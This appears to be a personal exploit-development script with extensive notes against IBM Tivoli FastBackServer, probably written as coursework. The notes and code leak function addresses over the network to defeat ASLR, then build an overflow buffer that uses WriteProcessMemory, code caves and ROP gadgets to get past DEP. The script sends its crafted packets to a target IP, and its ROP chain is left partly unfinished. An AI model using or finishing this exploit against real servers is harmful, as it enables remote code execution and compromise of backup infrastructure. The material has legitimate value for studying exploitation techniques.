r"""
=============================================================================
=========================== - Breakpoints (Old) - ===========================
=============================================================================
        bp wsock32!recv
        bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6
        bp FastBackServer!FX_AGENT_Cyclic+0xD0
        bp FastBackServer!FXCLI_OraBR_Exec_Command
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac
        bp FastBackServer!FXCLI_SetConfFileChunk+0x40

=============================================================================
============================== - Breakpoints - ==============================
=============================================================================
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0xd43    OpCode=0x2000
    bp FastBackServer!FXCLI_DebugDispatch+0xcc9         SymbolOperation
    bp FastBackServer!FXCLI_DebugDispatch+0xe04         SymGetSymFromName
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x7374   ReturnValue
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x96ac   ReturnValue
    bp FastBackServer!FXCLI_OraBR_Exec_Command+0x9877   BufferSend

=============================================================================
======================== - Packet/Buffer Structure - ========================
=============================================================================
        0x00       : Checksum DWORD
        0x04 - 0x34: psAgentCommand
                    - 0x04 - 0xC:   ??
                    - 0x10:         Opcde
                    - 0x14:         Offset for copy operation
                    - 0x18:         Size of copy operation
                    - 0x1C:         Offset for 2nd copy operation
                    - 0x20:         Size of 2nd copy operation
                    - 0x24:         Offset for 3rd copy operation
                    - 0x28:         Size of 3rd copy operation
                    - 0x2C - 0x34:  ??
        0x34 - End:  psCommandBuffer

=============================================================================
================================= - Notes - =================================
=============================================================================
Same func as before (FXCLI_OraBR_Exec_Command)

using a win32 api import from dbghelp.dll

function: SymGetSymFromName

FXCLI_OraBR_Exec_Command Opcode: 0x2000

BOOL IMAGEAPI SymGetSymFromName(
    [in]      HANDLE           hProcess,
    [in]      PCSTR            Name,
    [in, out] PIMAGEHLP_SYMBOL Symbol
);

typedef struct _IMAGEHLP_SYMBOL {
    DWORD SizeOfStruct;
    DWORD Address;
    DWORD Size;
    DWORD Flags;
    DWORD MaxNameLength;
    CHAR Name[1];
} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL;

SymbolOperation resolves WinAPIs and stores the
results in the psCommandBuffer


getIPAddr&Port -> gets existing TCP conn to send info back to
                  switched existing connection type to recieve buffer

01b30000 01b5b000
gsk8iccs C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll

01b60000 01b9a000
icclib019 C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll

02f80000 03070000
libeay32IBM019 C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll

Using IBM DLLs, we can ensure that our exploit is at least only tivoli
version dependent, and not dependent on windows versions

Rule of Thumb (RoT) for choosing modules is to ensure the upper bytes are
not 00, all 3 are fine here, ill use libeay32IBM019 as its the highest out
of the 3 modules

analyzing the library, an exported func `N98E_CRYPTO_get_new_lockid` has
an offset of +14E0 with an ordinal of 1026

by subtracting this offset from the leaked address of the func, we get the
base addr of the lib. this is aslr bypass

now to bypass DEP as ASLR is used in tandem to enhance DEP, we need to do
what was done before via VirtualAlloc and ROP gadgets, but this time we'll
use WriteProcessMemory to copy our code from the stack to the code
(text section)page of our target library

BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

now to find code caves, i.e. padding bytes
0x3c from MZ header -> PE Header
0x2c from PE header -> offset to code section

0:078> ? libeay32IBM019 + 1000
03141000

now to analyze the code section
!address 03141000

Usage:                  Image
Base Address:           03141000
End Address:            031d3000
Region Size:            00092000 ( 584.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
Type:                   01000000          MEM_IMAGE
Allocation Base:        03140000
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY


This can also be done with !dh, we just need to take the upper bound of the
code section and subtract it with a very large enough value to store our
shellcode

the book only subtracted 0x400, but ive seen that 0x900 is also good enough
00000c00


note: this is very confusing to follow while working with brain fog

lib: libeay32ibm019
offset1: 0x3c                                 <- gets us to PE header
offset2: 0x2c + offset1                       <- offset of code section
CS->libeay32ibm019: baseAddress + offset1     <- Code Section
then

libeay32ibm019 baseAddress + offset2 gets us to the code section

then

we use the END_ADDRESS of the code section
    - take away 0x400 bytes to make space for our code

now

to get the offset for this, we
    - END_ADDRESS - baseAddress - 0x400 (This gives offset from baseAddress to the code cave)

ENSURE: offset does not have any null bytes


just realized, this is needless. can use pykd to automate locating code caves
wrote locateCodeCaves.py, stored in /windbg_tools


after code caves we can abuse WPM to copy our shellcode from the overflown opCode
buffer to an executable page in memory

WPM takes
- hProcess 			<- Set to -1, stay within currentProc
- lpBaseAddress			<- Addr to write to (BaseAddr + Offset)
- lpBuffer			<- Shellcode stack Addr
- nSize				<- Shellcode Size
- lpNumberOfBytesWritten	<- DWORD in the .data section


Now ROP gadgets have to be offset based
to get image base
baseDLLAddr + 3c -> PE Header
baseDLLAddr + PEHeader + 34 -> ImageBase

=============================================================================

"""

import socket
import sys
from struct import pack

from colorama import Fore, Style, init
from modules.msfvenom_module import generatePayload
from numpy import byte
from rpyc import lib

DEBUG = False

init()


def leakFunctionAddress(func, socketTup):

    # Append SymbolOperation to the Func
    symOpFunc = b"SymbolOperation" + func

    # Checksum
    buf = bytearray()

    # psAgentCommand
    buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
    buf += pack("<i", 0x2000)  # Opcode                0x10
    buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
    buf += pack("<i", 0x100)  # 1st memcpy: size      0x18
    buf += pack("<i", 0x100)  # 2nd memcpy: offset    0x1C
    buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
    buf += pack("<i", 0x200)  # 3rd memcpy: offset    0x24
    buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
    buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34

    # psCommandBuffer
    buf += symOpFunc + b"A" * (0x100 - len(symOpFunc))
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Checksum
    buf = pack(">i", len(buf) - 4) + buf

    timeout_seconds = 5
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout_seconds)
            s.connect(socketTup)

            # Send the buffer to the server
            s.sendall(buf)
            if DEBUG:
                printBuffer(buf, width="dd")
                print(f"{Fore.GREEN}o Buffer sent {len(buf)} bytes successfully!{Style.RESET_ALL}")

            # Print out response from server
            if DEBUG:
                print(Fore.CYAN + f"o Waiting for response from server..." + Style.RESET_ALL)
            response = b""
            while True:
                try:
                    chunk = s.recv(1024)
                    if DEBUG:
                        print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
                except socket.timeout:
                    break
                if not chunk:
                    break
                response += chunk
                if b"Address is:" in response:
                    break

            if not response:
                print(Fore.RED + "[-] No response received from server" + Style.RESET_ALL)
                sys.exit(1)

            # Should have a valid response, parse it and get the address
            functionAddress = parseResponse(response)
            print(Fore.GREEN + f"o Leaked {func.decode('utf-8').strip(chr(0))}: {Fore.LIGHTYELLOW_EX} 0x{functionAddress:08x}" + Style.RESET_ALL)

            if functionAddress == 1:
                print(Fore.RED + f"[-] Failed to leak address for {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
                sys.exit(1)

            # Return the address only
            return functionAddress

    except socket.timeout:
        print(Fore.RED + "[-] Socket operation timed out" + Style.RESET_ALL)
        sys.exit(1)
    except socket.error as error:
        print(Fore.RED + f"[-] Socket error: {error}" + Style.RESET_ALL)
        sys.exit(1)


def printBuffer(buf, width="db"):
    if width == "db":
        w = 1
        groups_per_line = 16
    elif width == "dw":
        w = 2
        groups_per_line = 8
    elif width == "dd":
        w = 4
        groups_per_line = 4
    else:
        print(f"ERR: Invalid width {width}")
        exit(-1)
    bytes_per_line = groups_per_line * w
    for i in range(0, len(buf), bytes_per_line):
        print(
            Fore.YELLOW + f"\t" + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: " + Style.RESET_ALL,
            end="",
        )
        for g in range(groups_per_line):
            start = i + g * w
            if start >= len(buf):
                break
            if width == "db":
                for j in range(w):
                    if start + j < len(buf):
                        print(f"{buf[start+j]:02x}", end=" ")
                    else:
                        print("  ", end="")
            else:
                val = 0
                for j in range(w):
                    if start + j < len(buf):
                        val |= buf[start + j] << (8 * (w - 1 - j))
                if width == "dw":
                    print(f"{val:04x}", end=" ")
                elif width == "dd":
                    print(f"{val:08x}", end=" ")
        print()


def parseResponse(response):
    """Parse a server response and extract the leaked address"""
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        print("[-] Could not find the address in the Response")
        sys.exit()
    return address


def main():
    if len(sys.argv) != 2:
        print(f"ERR: No ip addr provided")
        exit(-1)

    server = sys.argv[1]
    port = 11460

    print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)

    try:
        functions = [b"N98E_CRYPTO_get_new_lockid" + b"\x00", b"WriteProcessMemory" + b"\x00"]
        leakedAddresses = []

        # ************************************************************************************
        # ******************************* ASLR Bypass Start***********************************
        # ************************************************************************************

        # Leak addresses of functions
        for func in functions:
            leakedAddresses.append(leakFunctionAddress(func, (server, port)))

        WPMAddr = leakedAddresses[1]  # WriteProcessMemory address
        exportedFunc = leakedAddresses[0]  # N98E_CRYPTO_get_new_lockid address

        # Target Function Offset observed from loading the dll in IDA was noted
        functionOffset = 0x14E0

        libraryBase = exportedFunc - functionOffset
        print(
            Fore.GREEN
            + f"o Calculated library base via\n\t\t {functions[0].decode("utf-8")}: {Fore.LIGHTYELLOW_EX}{str(hex(libraryBase))}"
            + Style.RESET_ALL
        )

        # ************************************************************************************
        # ************************************ Abuse WPM *************************************
        # ************************************************************************************

        # psAgentCommand
        buf = bytearray([0x41] * 0xC)
        buf += pack("<i", 0x534)  # opcode
        buf += pack("<i", 0x0)  # 1st memcpy: offset
        buf += pack("<i", 0x700)  # 1st memcpy: size field
        buf += pack("<i", 0x0)  # 2nd memcpy: offset
        buf += pack("<i", 0x100)  # 2nd memcpy: size field
        buf += pack("<i", 0x0)  # 3rd memcpy: offset
        buf += pack("<i", 0x100)  # 3rd memcpy: size field
        buf += bytearray([0x41] * 0x8)

        # psCommandBuffer
        # NOTE:: My code cave is larger than the book's 0x400
        #        which is why the offset is lower than 0x92c04
        wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
        wpm += pack("<L", (libraryBase + 0x880b0))  # Shellcode Return Address
        wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
        wpm += pack("<L", (libraryBase + 0x880b0))  # Code cave address
        wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
        wpm += pack("<L", (0x42424242))  # dummy nSize
        wpm += pack("<L", (libraryBase + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
        wpm += b"A" * 0x10

        offset = b"A" * (276 - len(wpm))
        eip = pack("<L", (libraryBase + 0x408D6))  # push esp; pop esi; ret <- Save ESP to ESI

        # Patching lpBuffer
        # rop =
        # mov eax, esi;

        # # Patching lpBuffer, need it to point to our shellcode address on stack
        # rop = pack("<L", (dllBase + 0x296f))     # mov eax, esi; pop esi; ret
        # rop += pack("<L", (0x42424242))          # dummy value
        # rop += pack("<L", (dllBase + 0x117c))    # pop ecx; ret
        # rop += pack("<L", (0x88888888))          # push huge value to
        # rop += pack("<L", (dllBase + 0x1d0f0))
        # rop += pack("<L", (dllBase + 0x117c))
        # rop += pack("<L", (0x77777878))
        # rop += pack("<L", (dllBase + 0x1d0f0))
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
        return 1


if __name__ == "__main__":
    sys.exit(main())
